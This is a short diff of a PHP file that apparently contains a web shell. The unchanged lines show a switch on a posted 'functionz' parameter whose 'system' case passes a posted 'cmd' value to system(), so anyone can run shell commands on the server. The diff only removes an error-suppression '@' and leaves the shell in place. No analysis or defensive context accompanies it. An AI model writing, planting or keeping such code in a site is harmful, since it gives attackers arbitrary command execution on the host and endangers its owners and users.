@@ -1,5 +1,5 @@
 <?php
-switch (@$_POST['functionz']) {
+switch ($_POST['functionz']) {
 case "system":
 	system(stripslashes($_POST['cmd']));
 	break;
